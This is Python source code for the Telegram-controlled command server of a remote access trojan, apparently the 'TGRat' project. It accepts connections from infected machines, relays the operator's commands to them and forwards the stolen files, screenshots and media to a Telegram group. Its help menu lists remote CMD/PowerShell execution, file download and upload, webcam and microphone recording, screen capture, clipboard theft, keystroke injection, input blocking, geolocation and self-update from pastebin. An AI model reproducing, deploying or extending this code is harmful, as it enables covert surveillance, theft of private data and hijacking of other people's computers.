import asyncio
import json
import logging
import tempfile
import time
import os
from datetime import datetime
import io
import aiofiles 
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import FSInputFile
from aiogram.filters import Command, BaseFilter, CommandObject
from aiogram.types import Message, ContentType

# Логирование
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s',
                    handlers=[logging.StreamHandler(), logging.FileHandler('server.log', encoding='utf-8')])
logger = logging.getLogger(__name__)

DATA = {}

# Чтение файла 'data_info.txt'
try:
    with open('data_info.txt', 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            
            if '=' in line:
                key, value = line.split('=', 1)
                DATA[key.strip()] = value.strip()

except FileNotFoundError:
    logger.error("Критическая ошибка: Файл 'data_info.txt' не найден. Проверьте путь.")

# Присвоение считанных значений переменным
try:
    TOKEN = DATA['TOKEN']
    GROUP_CHAT_ID = int(DATA['GROUP_CHAT_ID']) 

except KeyError as e:
    logger.error(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'.")
except ValueError:
    # Эта ошибка сработает, если значение не является числом
    logger.error("Ошибка: GROUP_CHAT_ID должен быть корректным целым числом.")

bot = Bot(TOKEN)
dp = Dispatcher()

clients = {}
upload_requests = {}
clients_lock = asyncio.Lock()
HOST = '0.0.0.0'
PORT = 1234 # Поменять
HISTORY_FILE = "client_history.json"
clients = {}
CLIENT_HISTORY_CACHE = {}
clients_lock = asyncio.Lock()
BOT_USERNAME = ""

class IsInGroup(BaseFilter):
    async def __call__(self, message: Message) -> bool:
        return message.chat.id == GROUP_CHAT_ID

def is_valid_filename(filename):
    invalid = '<>:"/\\|?*'
    return filename and all(c not in invalid for c in filename) and filename.strip() not in ['.', '..']


async def find_client_by_thread(thread_id):
    # Преобразование ID в int для корректного сравнения (Telegram ID всегда int)
    try:
        thread_id = int(thread_id)
    except (ValueError, TypeError):
        return None, None, None

    # clients_lock для безопасного чтения
    async with clients_lock:
        # Проходим по всем активным клиентам
        for client_id, data in clients.items():
            if data.get("thread_id") == thread_id:
                # Найдено: возвращаем ID клиента, Reader и Writer
                return client_id, data["reader"], data["writer"] 
    return None, None, None

    
async def load_client_history():
    """Асинхронно загружает историю клиентов из файла."""
    try:
        async with aiofiles.open(HISTORY_FILE, mode='r', encoding='utf-8') as f:
            content = await f.read()
            if content:
                # 🔥 Преобразуем строковые даты обратно в объекты datetime
                history_data = json.loads(content)
                for client_id, data in history_data.items():
                    if 'last_offline' in data and data['last_offline']:
                        data['last_offline'] = datetime.fromisoformat(data['last_offline'])
                    # --- NEW LINE: Добавляем first_seen ---
                    if 'first_seen' in data and data['first_seen']:
                        data['first_seen'] = datetime.fromisoformat(data['first_seen'])
                    # -------------------------------------
                return history_data
            return {}
    except FileNotFoundError:
        return {}
    except Exception as e:
        logger.error(f"Ошибка загрузки истории клиентов: {e}")
        return {}

async def save_client_history(history_data):
    # Асинхронно сохраняет историю клиентов в файл.
    try:
        # Важно: делаем копию для модификации, чтобы не менять сам кэш!
        data_to_save = history_data.copy()
        
        for client_id, data in data_to_save.items():
            
            # --- Исправление для 'last_offline' ---
            last_offline = data.get('last_offline')
            if isinstance(last_offline, datetime):
                # Если это объект datetime, конвертируем его в строку
                data['last_offline'] = last_offline.isoformat()
            
            # --- Исправление для 'first_seen' ---
            first_seen = data.get('first_seen')
            if isinstance(first_seen, datetime):
                # Если это объект datetime, конвертируем его в строку
                data['first_seen'] = first_seen.isoformat()
            # Если это строка или None, оставляем как есть.
                
        async with aiofiles.open(HISTORY_FILE, mode='w', encoding='utf-8') as f:
            await f.write(json.dumps(data_to_save, ensure_ascii=False, indent=4))
    except Exception as e:
        # Теперь эта ошибка не должна возникать
        logger.error(f"Ошибка сохранения истории клиентов: {e}")


async def send_client_command(message: Message, command: str):
    # Находит клиента и отправляет команду
    
    thread_id = message.message_thread_id if message.message_thread_id else message.chat.id
    try:
        # find_client_by_thread должна быть определена в вашем server.py
        _, _, writer = await find_client_by_thread(thread_id)
    except KeyError:
        await message.reply("❌ Оффлайн (Ошибка поиска клиента)")
        return
        
    if not writer:
        await message.reply("❌ Оффлайн")
        return
        
    try:
        payload = json.dumps({"command": command}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
        await message.reply(f"✅ Команда отправлена клиенту: `{command}`", parse_mode='Markdown')
    except Exception as e:
        await message.reply(f"❌ Ошибка отправки: {e}")


@dp.message(Command("playsound"), IsInGroup())
async def playsound_handler(message: Message, command: CommandObject):
    """Обработчик команды /playsound."""
    # command.args содержит все, что идет после /playsound
    user_path = command.args.strip() if command.args else ""
    
    if not user_path:
        await message.reply("Использование: /playsound <путь_к_файлу>")
        return
    
    # Отправляем полную команду клиенту
    full_command = f"/playsound {user_path}"
    await send_client_command(message, full_command)


@dp.message(Command("stopsound"), IsInGroup())
async def stopsound_handler(message: Message):
    """Обработчик команды /stopsound."""
    await send_client_command(message, "/stopsound")
    
async def handle_client(reader, writer):
    global CLIENT_HISTORY_CACHE # 🔥 Используем глобальный кэш
    
    # Инициализация переменных для безопасного scope
    client_id = None
    thread_id = None
    
    # 🔥 Получение addr и сохранение текущего writer
    try:
        addr = writer.get_extra_info('peername')
    except Exception:
        addr = ('Unknown IP', 0)
        
    current_writer = writer # Сохраняем ссылку на текущий writer для защиты от гонки
    
    try:
        # 1. Handshake
        line = await reader.readline()
        if not line.endswith(b'\n'):
            return
        handshake = json.loads(line.rstrip(b'\n').decode('utf-8'))
        client_id = handshake.get("client_id", "").strip()
        if not client_id or len(client_id) < 5:
            return
        logger.info(f"Клиент {client_id} подключен {addr}")

        # 2. Топик / Регистрация (С логикой CLIENT_HISTORY_CACHE)
        async with clients_lock:
            
            if client_id in CLIENT_HISTORY_CACHE:
                thread_id = CLIENT_HISTORY_CACHE[client_id].get('thread_id')
                first_seen_date = CLIENT_HISTORY_CACHE[client_id].get('first_seen')
                
                # Если в истории нет first_seen (старая запись), устанавливаем ее сейчас
                if not first_seen_date:
                    first_seen_date = datetime.now()
            else:
                # Это абсолютно новый клиент
                thread_id = None # Создастся ниже
                first_seen_date = datetime.now()

            # 2.1. Поиск существующего thread_id в истории
            # 🔥 Используем только CLIENT_HISTORY_CACHE
            if client_id in CLIENT_HISTORY_CACHE:
                thread_id = CLIENT_HISTORY_CACHE[client_id]['thread_id']

            if client_id in clients:
                # Клиент переподключился: используем существующий thread_id и обновляем данные
                thread_id = clients[client_id]["thread_id"] 
                clients[client_id].update({
                    "writer": writer, 
                    "reader": reader, 
                    "last_seen": datetime.now(), 
                    "addr": addr
                })
                
                # 🔥 Если клиент был оффлайн, сбрасываем last_offline и сохраняем
                if client_id in CLIENT_HISTORY_CACHE:
                    CLIENT_HISTORY_CACHE[client_id]['last_offline'] = None 
                    CLIENT_HISTORY_CACHE[client_id]['first_seen'] = first_seen_date
                    await save_client_history(CLIENT_HISTORY_CACHE)

            else:
                # Новый клиент: создаем топик, если thread_id не найден
                if not thread_id:
                    try:
                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=f"Клиент {client_id}")
                        thread_id = topic.message_thread_id
                    except Exception as e:
                        logger.error(f"Топик ошибка: {e}")
                        thread_id = None
                        
                # 2.2. Записываем/обновляем клиента в активном списке и в истории
                clients[client_id] = {
                    "writer": writer,
                    "reader": reader,
                    "thread_id": thread_id,
                    "last_seen": datetime.now(),
                    "addr": addr
                }
                
                # 🔥 Обновляем CLIENT_HISTORY_CACHE
                CLIENT_HISTORY_CACHE[client_id] = {
                    "thread_id": thread_id,
                    "last_offline": None, # Онлайн
                    "first_seen": first_seen_date, # NEW: Используем определенную выше дату
                }
                await save_client_history(CLIENT_HISTORY_CACHE)
                
        if thread_id:
            try:
                # 1. Попытка отправить сообщение в существующий топик
                await bot.send_message(GROUP_CHAT_ID, f"✅ {client_id} онлайн", message_thread_id=thread_id)
            except Exception as e:
                logger.error(f"Ошибка отправки 'онлайн' сообщения в топик {thread_id} для {client_id}: {e}")
                
                # Если произошла ошибка (Bad Request: message thread not found), 
                # топик, вероятно, был удален. Попытка создать новый.
                if "thread not found" in str(e) or "Bad Request" in str(e):
                    logger.info(f"Топик {thread_id} для {client_id} не найден. Попытка пересоздания...")
                    new_thread_id = None
                    
                    try:
                        # 💥 ПОВТОРНАЯ ПОПЫТКА СОЗДАНИЯ ТОПИКА
                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=f"Клиент {client_id}")
                        new_thread_id = topic.message_thread_id
                        
                        # ОБЯЗАТЕЛЬНО ОБНОВЛЯЕМ КЭШ и список активных клиентов
                        async with clients_lock:
                            # Обновляем активный клиент
                            if client_id in clients:
                                clients[client_id]["thread_id"] = new_thread_id
                            
                            # Обновляем историю и сохраняем на диск
                            if client_id in CLIENT_HISTORY_CACHE:
                                CLIENT_HISTORY_CACHE[client_id]['thread_id'] = new_thread_id
                                await save_client_history(CLIENT_HISTORY_CACHE)
                                
                        thread_id = new_thread_id

                        # Отправляем сообщение в новый топик
                        if new_thread_id:
                            await bot.send_message(GROUP_CHAT_ID, 
                                                   f"✅ Клиент {client_id} онлайн. ⚠️ Топик был удален, но успешно пересоздан с ID: {new_thread_id}", 
                                                   message_thread_id=new_thread_id)
                        
                    except Exception as create_e:
                        logger.error(f"Критическая ошибка при пересоздании топика для {client_id}: {create_e}")
                        await bot.send_message(GROUP_CHAT_ID, 
                                               f"❌ Критическая ошибка: Клиент {client_id} онлайн, но топик не создан: {create_e}")

        # 3. Цикл обработки данных (С Heartbeat)
        while True:
            try:
                # 🔥 HEARTBEAT: Таймаут чтения 20 секунд
                line = await asyncio.wait_for(reader.readline(), timeout=20)
            except asyncio.TimeoutError:
                logger.warning(f"Таймаут чтения от {client_id}. Разрыв соединения.")
                break # Выход из цикла, триггер finally
            except ConnectionResetError:
                break # Клиент закрыл соединение
            
            if not line.endswith(b'\n'):
                break
            line = line.rstrip(b'\n')
            if not line:
                continue
                
            try:
                res = json.loads(line.decode('utf-8'))
                command_name = res.get('command')
                
                # 🔥 ОБРАБОТКА PING
                if command_name and command_name.lower().strip() == "/ping":
                    async with clients_lock:
                        if client_id in clients:
                            clients[client_id]["last_seen"] = datetime.now()
                    continue

                # 🔥 БЛОК 1: ОБРАБОТКА ФАЙЛОВОГО ОТВЕТА ДЛЯ /tasklist и /execute
                if command_name == "/response_file":
                    file_name = res.get("file_name", "output.txt")
                    
                    # 1. Получаем размер файла
                    size_data = await reader.readuntil(b'\n')
                    file_size = int(size_data.strip())
                    
                    # 2. Читаем тело файла
                    file_data = await reader.readexactly(file_size)
                    
                    # 3. Сохраняем на Сервере
                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix=f"_{file_name}") as tmp_file:
                        tmp_file.write(file_data)
                        temp_file_path = tmp_file.name
                        
                    # 4. Отправляем файл в Telegram
                    tg_file = FSInputFile(temp_file_path, filename=file_name)
                    caption_text = res.get("result", f"✅ Вывод команды *{file_name}*:")
                    
                    await bot.send_document(
                        chat_id=GROUP_CHAT_ID, 
                        document=tg_file, 
                        caption=caption_text, 
                        message_thread_id=thread_id,
                        parse_mode='Markdown'
                    )
                    
                    # 5. Очистка
                    os.remove(temp_file_path)
                    continue
                
                # --------------------------------------------------------------------------------------
                # БЛОК 2(Обработка простого текстового результата)
                if "result" in res:
                    await bot.send_message(GROUP_CHAT_ID, res["result"], message_thread_id=thread_id)
                    continue
                    
                # БЛОК 3: СТАРЫЙ КОД (Обработка других файлов, инициированных Клиентом, например, скриншотов)
                if "file_name" in res and "file_size" in res:
                    name = res["file_name"]
                    size = int(res["file_size"])
                    if size <= 0 or size > 50 * 1024 * 1024:
                        await reader.readexactly(size)
                        await bot.send_message(GROUP_CHAT_ID, "❌ Файл битый или большой", message_thread_id=thread_id)
                        continue
                    data = b''
                    while len(data) < size:
                        chunk = await reader.read(min(8192, size - len(data)))
                        if not chunk:
                            raise ConnectionError("Разрыв файла")
                        data += chunk
                    if len(data) != size:
                        await bot.send_message(GROUP_CHAT_ID, "❌ Неполный файл", message_thread_id=thread_id)
                        continue
                    suffix = os.path.splitext(name)[1] or ".bin"
                    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
                        tmp.write(data)
                        tmp_path = tmp.name
                    try:
                        caption = f"{client_id}: {name} ({size}B)"
                        if name.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                            await bot.send_photo(GROUP_CHAT_ID, FSInputFile(tmp_path), caption=caption, message_thread_id=thread_id)
                        else:
                            await bot.send_document(GROUP_CHAT_ID, FSInputFile(tmp_path), caption=caption, message_thread_id=thread_id)
                        logger.info(f"Файл {name} от {client_id} отправлен в TG")
                    except Exception as tg_e:
                        logger.error(f"TG ошибка: {tg_e}")
                        await bot.send_message(GROUP_CHAT_ID, f"❌ TG: {tg_e}", message_thread_id=thread_id)
                    finally:
                        os.unlink(tmp_path)
                    continue
            except json.JSONDecodeError:
                continue
            except Exception as e:
                logger.error(f"Обработка: {e}")
                
    except Exception as e:
        log_id = client_id if client_id else str(addr)
        logger.error(f"Крит: {log_id}: {e}")
        
    finally:
        log_id = client_id if client_id else str(addr)
        logger.info(f"Отключен {log_id}")

        # 1. Удаление клиента из списка (Защита от гонки удаления)
        should_delete = False
        if client_id:
            async with clients_lock:
                # ВАЖНО: УДАЛЯЕМ, ТОЛЬКО ЕСЛИ НАШ WRITER ВСЕ ЕЩЕ ЯВЛЯЕТСЯ АКТИВНЫМ (ПРЕДОТВРАЩАЕМ УДАЛЕНИЕ НОВОГО ПОДКЛЮЧЕНИЯ)
                if client_id in clients and clients[client_id].get('writer') is current_writer:
                    del clients[client_id]
                    should_delete = True
                    
                    # 🔥 ОБНОВЛЕНИЕ ИСТОРИИ (Установка времени последнего визита)
                    if client_id in CLIENT_HISTORY_CACHE:
                        CLIENT_HISTORY_CACHE[client_id]['last_offline'] = datetime.now()
                        await save_client_history(CLIENT_HISTORY_CACHE)
                else:
                    # Если клиент переподключился, просто обнуляем старые дескрипторы
                    if client_id in clients:
                        clients[client_id]["writer"] = None
                        clients[client_id]["reader"] = None


        # 2. Отправляем сообщение об отключении, только если МЫ УДАЛИЛИ КЛИЕНТА
        if should_delete and client_id and thread_id:
            try:
                await bot.send_message(
                    GROUP_CHAT_ID, 
                    f"🔴 *Клиент {client_id} отключился (ОФФЛАЙН)!*", 
                    message_thread_id=thread_id,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Ошибка отправки оффлайн-сообщения: {e}")

        # 3. Аккуратное закрытие писателя (с подавлением ConnectionResetError)
        if writer:
            writer.close()
            # 🔥 Изолируем проблемный вызов в try/except
            try:
                await writer.wait_closed()
            except ConnectionResetError:
                pass 
            except ConnectionAbortedError:
                pass
                
async def tcp_server():
    server = await asyncio.start_server(handle_client, HOST, PORT)
    logger.info(f"Сервер на {HOST}:{PORT}")
    async with server:
        await server.serve_forever()

async def check_clients_status():
    while True:
        await asyncio.sleep(300)
        now = datetime.now()
        async with clients_lock:
            dead = [cid for cid, info in clients.items() if info["writer"] is None and (now - info["last_seen"]).total_seconds() > 600]
            for cid in dead:
                tid = clients[cid]["thread_id"]
                if tid:
                    await bot.send_message(GROUP_CHAT_ID, f"⏰ Таймаут {cid}", message_thread_id=tid)
                del clients[cid]


# ====== TG хэндлеры ======
@dp.message(Command('help'), IsInGroup())
async def handle_help(message: Message):
    help_text = """
<b>💻 💎Секретные данные💎</b>
    <b><a href="https://github.com/EZIKALEXANDR/TGRat">Исходный код</a></b>
    <b>Made by @UNBLOCK_COMPUTER</b>
-----------------------------------
<b>📁 Файловый менеджер</b>
<code>/ls [путь]</code> — список файлов/папок (в корне <code>/</code> — диски)
<code>/cd &lt;путь&gt;</code> — сменить директорию
<code>/back</code> — вернуться назад (из корня диска — в список дисков)
<code>/pwd</code> — показать текущий путь
<code>/mkdir &lt;имя&gt;</code> — создать папку
<code>/delete &lt;имя&gt;</code> — удалить файл или папку
<code>/rename &lt;старое&gt;/n&lt;новое&gt;</code> — переименовать
<code>/copy &lt;источник&gt;/to&lt;назначение&gt;</code> — копировать
<code>/move &lt;источник&gt;/to&lt;назначение&gt;</code> — переместить

<b>📥 Передача файлов</b>
<code>/download &lt;файл&gt;</code> — скачать файл с клиента в Telegram
<code>/upload [имя]</code> — загрузить файл из Telegram на клиент (ответом на файл)
<code>/download_link &lt;URL&gt; [0]</code> — скачать файл по ссылке (<code>0</code> — без запуска)

<b>⚙️ Система и выполнение</b>
<code>/run &lt;файл&gt;</code> — запустить программу/файл
<code>/execute &lt;команда&gt;</code> — выполнить CMD/PowerShell
<code>/sysinfo</code> — информация о системе (ЦПУ, память, диск)
<code>/tasklist</code> — список процессов (отправка TXT)
<code>/taskkill &lt;имя.exe или PID&gt;</code> — завершить процесс
<code>/restart</code>(нестабильно) — перезапустить клиента
<code>/cmdbomb</code> — открыть 10 окон CMD

<b>💬 Интерфейс и уведомления</b>
<code>/msg [тип] [заголовок]/t&lt;текст&gt;</code> — показать окно на клиенте
<code>/changeclipboard &lt;текст&gt;</code> — установить содержимое буфера обмена
<code>/clipboard</code> — получить содержимое буфера обмена

<b>🖱️ Управление вводом и экраном</b>
<code>/screenshot</code> или <code>/sc</code> — скриншот экрана
<code>/photo [индекс]</code> — фото с веб-камеры
<code>/minimize</code> — свернуть активное окно
<code>/maximize</code> — развернуть активное окно
<code>/altf4</code> — закрыть активное окно
<code>/keypress &lt;клавиши&gt;</code> — нажать комбинацию (например: <code>alt f4</code>, <code>win r</code>)
<code>/mouseclick</code> — клик мышью
<code>/mousemove &lt;X&gt; &lt;Y&gt;</code> — переместить курсор
<code>/keytype &lt;текст&gt;</code> — ввести текст (с поддержкой кириллицы)
<code>/open_image &lt;сек&gt; &lt;путь&gt;</code> — открыть картинку на полный экран на N секунд
<code>/applist [&lt;индекс&gt;]</code> — посмотреть список окон или вывести одно из них "вперед".
<code>/applist_close &lt;индекс&gt;</code> — закрыть выбранное окно.

<b>👾 Автоматизация</b>
<code>/mousemesstart</code> — включить случайное движение мыши
<code>/mousemesstop</code> — остановить хаос мыши
<code>/auto &lt;сек&gt; [screen|webcam|both] [инд. камеры]</code> — авто-отправка скриншотов/фото
<code>/stop</code> — остановить <code>/auto</code>

<b>🔇 Мультимедиа</b>
<code>/playsound &lt;путь&gt;</code> — воспроизвести аудиофайл на клиенте
<code>/stopsound</code> — остановить воспроизведение
<code>/mic &lt;сек&gt;</code> — запись с микрофона (до 30 сек)
<code>/webcam &lt;индекс&gt; &lt;сек&gt;</code> — запись видео с камеры (до 30 сек)
<code>/screenrecord &lt;сек&gt;</code> — запись видео с экрана (до 60 сек)
<code>/volumeplus [N]</code> — увеличить громкость (по умолчанию +10%)
<code>/volumeminus [N]</code> — уменьшить громкость (по умолчанию -10%)

<b>🔧 Прочее</b>
<code>/wallpaper &lt;путь&gt;</code> — установить обои
<code>/block</code> — заблокировать мышь и клавиатуру
<code>/unblock</code> — разблокировать ввод
<code>/location</code> — отправка местоположения(страна, город и т.д) клиента
<code>/update [pastebin raw]</code> - обновить версию на стороне клиента
<code>/clients</code> - посмотреть активных клиентов и их историю
<code>/version</code> - посмотреть версию ПО на стороне клиента

    <i>ver beta v20</i>"""
    await message.reply(help_text, parse_mode="HTML")

async def get_client_status(client_id):
    """Возвращает статус клиента: 🟢 (online) или ⚫ (offline с датой)."""
    global CLIENT_HISTORY_CACHE
    
    first_seen_str = ""
    
    # 🔥 NEW: Извлекаем и форматируем first_seen из кэша
    if client_id in CLIENT_HISTORY_CACHE:
        first_seen = CLIENT_HISTORY_CACHE[client_id].get('first_seen')
        if first_seen and isinstance(first_seen, datetime):
            first_seen_str = f"\n*Первое: {first_seen.strftime('%Y-%m-%d %H:%M:%S')}*" # Форматируем
        elif first_seen and isinstance(first_seen, str):
             # На случай, если конвертация в load_client_history не сработала по какой-то причине
             try:
                 first_seen_str = f"\n*Первое: {datetime.fromisoformat(first_seen).strftime('%Y-%m-%d %H:%M:%S')}*"
             except ValueError:
                 pass
                 

    async with clients_lock:
        # 1. Проверяем активных клиентов
        if client_id in clients and clients[client_id].get('writer'):
            last_seen_time = clients[client_id]['last_seen'].strftime("%H:%M:%S")
            # --- NEW LINE ---
            return f"🟢 {last_seen_time}{first_seen_str}" # Добавляем first_seen_str
            # ----------------
            
        # 2. Проверяем историю
        if client_id in CLIENT_HISTORY_CACHE:
            last_offline = CLIENT_HISTORY_CACHE[client_id].get('last_offline')
            if last_offline:
                if isinstance(last_offline, str):
                    try:
                        last_offline = datetime.fromisoformat(last_offline)
                        CLIENT_HISTORY_CACHE[client_id]['last_offline'] = last_offline
                    except ValueError:
                        logger.error(f"История: Неверный формат даты для {client_id}: {last_offline}")
                        return f"⚫ Оффлайн (был: Ошибка даты){first_seen_str}"
                
                offline_time = last_offline.strftime("%Y-%m-%d %H:%M:%S")
                # --- NEW LINE ---
                return f"⚫ Оффлайн (был: {offline_time}){first_seen_str}" # Добавляем first_seen_str
                # ----------------
                
        return "❓ Неизвестно"


@dp.message(Command('clients'), IsInGroup())
async def handle_clients(message: Message):
    global CLIENT_HISTORY_CACHE
    
    if not CLIENT_HISTORY_CACHE:
        await message.reply("Нет зарегистрированных клиентов в истории.")
        return

    response = ["*Клиенты (Онлайн / История):*"]
    
    sorted_client_ids = sorted(CLIENT_HISTORY_CACHE.keys())
    
    for client_id in sorted_client_ids:
        # Убедимся, что у нас есть thread_id, прежде чем формировать ссылку
        thread_id = CLIENT_HISTORY_CACHE[client_id].get('thread_id', message.message_thread_id) 
        status = await get_client_status(client_id)
        
        # Формируем ссылку на топик
        response.append(f"[{client_id}](tg://message?message_thread_id={thread_id}) | {status}")
        
    await message.reply('\n'.join(response), parse_mode='Markdown')


@dp.message(Command('download'), IsInGroup())
async def handle_download(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    fname = command.args.strip() if command.args else ""
    if not fname:
        await message.reply("❌ Имя файла")
        return
    _, _, writer = await find_client_by_thread(thread_id)
    if not writer:
        await message.reply("❌ Клиент оффлайн")
        return
    try:
        payload = json.dumps({"command": f"/download {fname}"}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")

@dp.message(Command('msg'), IsInGroup())
async def handle_msg(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    args = command.args or ""
    if not args:
        await message.reply("❌ /msg [type] [title]/t<text>")
        return
    _, _, writer = await find_client_by_thread(thread_id)
    if not writer:
        await message.reply("❌ Оффлайн")
        return

    thread_id = message.message_thread_id
    client_id_to_remove = None # Переменная для удаления    
    try:
        payload = json.dumps({"command": f"/msg {args}"}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
        await message.reply("✅ Отправлено")
    except Exception as e:
    # 🔥 ИСПРАВЛЕНИЕ: Если отправка не удалась (например, ConnectionResetError или BrokenPipeError)
    
    # 1. Помечаем клиента для удаления
        async with clients_lock:
            for cid, data in clients.items():
                if data['thread_id'] == thread_id:
                    client_id_to_remove = cid
                    # Удаляем клиента из списка, потому что соединение мертво
                    del clients[cid] 
                    break
                    
        # 2. Уведомляем Telegram об отключении
        if client_id_to_remove:
            await message.reply(f"❌ Оффлайн. Клиент {client_id_to_remove} был удален из активных сессий.")
            
            # Отправляем сообщение в топик
            try:
                await bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    message_thread_id=thread_id,
                    text=f"🔴 *Клиент {client_id_to_remove} отключился (ОФФЛАЙН)!*\n(Обнаружено при попытке отправки команды)",
                    parse_mode='Markdown'
                )
            except Exception:
                pass # Игнорируем сбои Telegram
                
        else:
            # Если клиента не нашли, но ошибка есть (маловероятно после Heartbeat)
            await message.reply(f"❌ Ошибка отправки команды: {e}")
    
        # Очищаем нерабочий writer
        if writer:
            writer.close()
            
        return
@dp.message(Command(commands=["upload"]), IsInGroup())
async def handle_upload_command(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    # Извлекаем аргумент (например, "привет")
    args = command.args.strip() if command.args else ""
    
    # 1. Проверяем онлайн-статус клиента
    # find_client_by_thread теперь возвращает (cid, reader, writer)
    cid, _, writer = await find_client_by_thread(thread_id) 
    
    if not writer:
        await message.reply("❌ Клиент оффлайн.")
        return

    # 2. Отправляем запрос и сохраняем данные
    desired_name = args if args else "по умолчанию"
    
    # Отправляем сообщение, на которое пользователь должен ответить
    prompt_msg = await message.reply(f"✅ Готов к загрузке. Ответьте на это сообщение файлом. Желаемое имя: {desired_name}")
    
    # Сохраняем желаемое имя, привязанное к ID ответного сообщения
    upload_requests[prompt_msg.message_id] = {
        "client_id": cid,
        "filename": args # Сохраняем желаемое имя ("привет")
    }


@dp.message(Command(commands=['screenshot', 'sc', 'photo', 'auto', 'stop']), IsInGroup())
async def handle_special(message: Message, command: CommandObject):
    thread_id = message.message_thread_id
    cmd = f"/{command.command}"
    args = command.args or ""
    full = f"{cmd} {args}".strip()
    _, _, writer = await find_client_by_thread(thread_id)
    if not writer:
        await message.reply("❌ Оффлайн")
        return
    try:
        payload = json.dumps({"command": full}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")

@dp.message(F.content_type.in_({ContentType.DOCUMENT, ContentType.PHOTO, ContentType.AUDIO, ContentType.VIDEO, ContentType.VOICE, ContentType.VIDEO_NOTE, ContentType.ANIMATION}), IsInGroup())
async def handle_file(message: Message):
    
    # 1. Ищем запрос в upload_requests
    req = None
    if message.reply_to_message and message.reply_to_message.message_id in upload_requests:
        req = upload_requests.pop(message.reply_to_message.message_id)
        cid = req["client_id"]
        base_name = req["filename"]
    else:
        # Если это просто файл, отправленный без команды /upload, мы не можем его переименовать
        return
        
    await message.reply("⚙️ Загружаю файл с Telegram...")

    # 2. ПОЛУЧЕНИЕ READER/WRITER
    async with clients_lock:
        client_info = clients.get(cid, {})
        reader = client_info.get("reader") 
        writer = client_info.get("writer")
    
    if not writer or not reader:
        await message.reply("❌ Клиент оффлайн или сокет не готов.")
        return
    
    try:
        # 3. ОПРЕДЕЛЕНИЕ ТИПА ФАЙЛА
        file_obj = None
        
        if message.document:
            file_obj = message.document
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".bin"
        elif message.photo:
            file_obj = message.photo[-1]
            ext = ".jpg"
            orig_name = f"photo_{int(time.time())}.jpg" # Временное имя
        elif message.video:
            file_obj = message.video
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".mp4"
        elif message.audio:
            file_obj = message.audio
            orig_name = file_obj.file_name or ""
            ext = os.path.splitext(orig_name)[1] or ".mp3"
        else:
            await message.reply("❌ Тип файла не поддерживается")
            return
        
        file_id = file_obj.file_id
        file_info = await bot.get_file(file_id)
        file_path = file_info.file_path
        fsize = file_info.file_size

        # 4. ФОРМИРОВАНИЕ ФИНАЛЬНОГО ИМЕНИ
        # Если base_name (из команды) установлен, используем его + расширение.
        if base_name:
            fname = base_name + ext
        else:
            fname = orig_name or f"file_{int(time.time())}{ext}"
            
        downloaded = io.BytesIO()
        await bot.download_file(file_path, downloaded)

        # 5. ОТПРАВКА КЛИЕНТУ
        # Передаем КОРРЕКТНОЕ ИМЯ (fname) в метаданных!
        payload = json.dumps({"command": "/upload", "file_name": fname, "file_size": fsize}, ensure_ascii=False).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
        
        writer.write(downloaded.getvalue())
        await writer.drain() 
        
        logger.info(f"Файл {fname} ({fsize}B) отправлен клиенту. Ожидаю подтверждения...")
        
        await message.reply(f"✅ Файл *{fname}* ({fsize}B) отправлен клиенту. Ожидайте подтверждения о сохранении.")
             
    except Exception as e:
        await message.reply(f"❌ Ошибка загрузки: {e}")
        logger.error(f"Upload TG: {e}")
        

@dp.message(F.text.startswith('/'), IsInGroup())
async def handle_generic_command(message: Message):
    thread_id = message.message_thread_id
    text = message.text
    
    # 1. Извлекаем команду без аргументов и упоминания
    cmd_part = text.lower().split()[0]
    pure_cmd_name = cmd_part.split('@')[0]

    # 💥 БЛОКИРОВКА UPLOAD
    if pure_cmd_name == "/upload":
        await message.reply("❌ Для загрузки файла (upload) отправьте сам файл в этот чат, не команду.")
        return
        
    # 2. Обработка упоминания бота (Оставьте ваш код, он корректен)
    if '@' in cmd_part:
        # Ваш код здесь
        cmd, botname = cmd_part.split('@', 1)
        if botname.lower() != BOT_USERNAME:
            return
        text = cmd + text[len(cmd_part):] # Очищаем команду
        
    # 3. ПОИСК КЛИЕНТА (Здесь возникает ошибка KeyError: 0)
    # Эта строка вызывает ошибку, если в clients лежит словарь вместо кортежа.
    _, _, writer = await find_client_by_thread(thread_id)
    
    if not writer:
        await message.reply("❌ Оффлайн")
        return
    try:
        payload = json.dumps({"command": text}).encode('utf-8') + b'\n'
        writer.write(payload)
        await writer.drain()
    except Exception as e:
        await message.reply(f"❌ {e}")

async def main():
    global BOT_USERNAME, CLIENT_HISTORY_CACHE
    # 🔥 Инициализация истории при запуске
    CLIENT_HISTORY_CACHE = await load_client_history()
    me = await bot.get_me()
    BOT_USERNAME = me.username.lower()
    logger.info(f"Бот @{BOT_USERNAME}")
    asyncio.create_task(tcp_server())
    asyncio.create_task(check_clients_status())
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
